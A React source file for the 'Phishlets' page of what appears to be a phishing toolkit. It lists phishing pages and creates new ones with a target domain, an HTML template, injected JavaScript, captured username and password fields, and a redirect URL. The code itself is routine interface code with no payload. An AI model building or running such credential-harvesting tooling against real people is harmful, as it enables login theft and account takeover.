import { useEffect, useState } from 'react'
import PageHeader from '../components/PageHeader'
import DataTable from '../components/DataTable'
import { phishlets } from '../utils/api'
import { Globe, Plus, Eye, Trash2 } from 'lucide-react'

export default function PhishletsPage() {
  const [items, setItems] = useState([])
  const [showForm, setShowForm] = useState(false)
  const [form, setForm] = useState({
    name: '', targetDomain: '', htmlTemplate: '', cssOverride: '',
    jsInject: '', captureFields: ['username', 'password'], redirectUrl: ''
  })

  useEffect(() => { loadPhishlets() }, [])

  const loadPhishlets = async () => {
    const data = await phishlets.list()
    if (data) setItems(data)
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    await phishlets.create(form)
    setShowForm(false)
    loadPhishlets()
  }

  const columns = [
    { key: 'name', label: 'Name' },
    { key: 'target_domain', label: 'Target Domain' },
    { key: 'is_active', label: 'Status', render: (row) => (
      <span className={`text-xs px-2 py-1 rounded ${row.is_active ? 'bg-wuzen-success/10 text-wuzen-success' : 'bg-wuzen-muted/20 text-wuzen-muted'}`}>
        {row.is_active ? 'ACTIVE' : 'INACTIVE'}
      </span>
    )},
    { key: 'created_at', label: 'Created', render: (row) => (
      <span className="text-xs font-mono">{new Date(row.created_at).toLocaleDateString()}</span>
    )},
    { key: 'actions', label: '', render: (row) => (
      <div className="flex gap-2">
        <button className="p-1 rounded hover:bg-wuzen-card text-wuzen-primary">
          <Eye className="w-4 h-4" />
        </button>
      </div>
    )}
  ]

  return (
    <div className="animate-fade-in">
      <PageHeader title="Phishlets" icon={Globe} deviceSelector={false}>
        <button onClick={() => setShowForm(!showForm)} className="wuzen-btn-primary">
          <Plus className="w-4 h-4" /> New Phishlet
        </button>
      </PageHeader>

      {showForm && (
        <div className="wuzen-panel p-6 mb-6">
          <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-4">Create Phishlet</h3>
          <form onSubmit={handleSubmit} className="grid grid-cols-2 gap-4">
            <input className="wuzen-input" placeholder="Name" value={form.name} onChange={e => setForm(p => ({...p, name: e.target.value}))} required />
            <input className="wuzen-input" placeholder="Target Domain" value={form.targetDomain} onChange={e => setForm(p => ({...p, targetDomain: e.target.value}))} />
            <textarea className="wuzen-input col-span-2 h-24" placeholder="HTML Template" value={form.htmlTemplate} onChange={e => setForm(p => ({...p, htmlTemplate: e.target.value}))} />
            <textarea className="wuzen-input h-24" placeholder="CSS Override" value={form.cssOverride} onChange={e => setForm(p => ({...p, cssOverride: e.target.value}))} />
            <textarea className="wuzen-input h-24" placeholder="JS Inject" value={form.jsInject} onChange={e => setForm(p => ({...p, jsInject: e.target.value}))} />
            <input className="wuzen-input" placeholder="Redirect URL" value={form.redirectUrl} onChange={e => setForm(p => ({...p, redirectUrl: e.target.value}))} />
            <div className="flex items-end gap-2">
              <button type="submit" className="wuzen-btn-primary">Create</button>
              <button type="button" onClick={() => setShowForm(false)} className="wuzen-btn border border-wuzen-border text-wuzen-muted">Cancel</button>
            </div>
          </form>
        </div>
      )}

      <DataTable columns={columns} data={items} keyField="id" searchable />
    </div>
  )
}
